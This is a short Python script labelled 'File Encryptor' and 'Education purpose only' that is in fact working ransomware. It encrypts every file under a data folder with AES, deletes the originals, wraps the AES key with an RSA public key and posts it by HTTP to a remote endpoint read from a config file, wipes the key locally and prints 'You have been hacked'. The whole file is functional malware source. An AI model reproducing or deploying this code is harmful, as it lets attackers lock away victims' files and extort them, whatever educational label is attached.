# File Encryptor
# Education purpose only
import codecs
import gc
import json
import os
import base64
import pickle
import uuid
from urllib.request import urlopen

import Crypto.Random
from Crypto.Cipher import AES, PKCS1_OAEP
from os import walk, rename
from os.path import isdir, isfile, join, splitext

from Crypto.PublicKey import RSA
from urllib import request
from config import ENDPOINT

key = Crypto.Random.get_random_bytes(32)


def encrypt(file):
    global key
    f = open(file, 'rb')
    data = f.read()
    f.close()

    os.remove(file)
    base = os.path.splitext(file)[0]

    cipher = AES.new(key, AES.MODE_CFB)
    cipheredData = cipher.encrypt(data)

    with open(base + '.e2e', "wb+") as f:
        f.write(cipheredData)
        f.close()

    with open(base + '.e2eext', "w+") as f:
        f.write(os.path.splitext(file)[1])
        f.close()

    with open(base + '.e2eiv', "wb+") as f:
        f.write(cipher.iv)
        f.close()


def send():
    global key
    #print(key)
    f = open('../Server/database', 'w+')

    RSA_key = RSA.import_key(open("./pub.pem").read())
    session_key = Crypto.Random.get_random_bytes(16)

    # Encrypt the session key with the public RSA key
    cipher_rsa = PKCS1_OAEP.new(RSA_key)
    enc_session_key = cipher_rsa.encrypt(session_key)

    # Encrypt the data with the AES session key
    cipher_aes = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher_aes.encrypt_and_digest(key)

    f.write(codecs.encode(pickle.dumps([x for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]), "base64").decode())

    req = request.Request(ENDPOINT+'/add', headers={
        'Content-Type': 'application/json'
    }, data=bytes(json.dumps({
        'uid': str(uuid.uuid4()),
        'key': codecs.encode(pickle.dumps([x for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]), "base64").decode()
    }), 'utf-8'))
    urlopen(req)

    del key
    gc.collect()


def main():
    for root, dirs, files in walk('./data'):
        for f in files:
            encrypt(join(root, f))

    send()
    print(
        """You have been hacked"""
    )


if __name__ == '__main__':
    main()
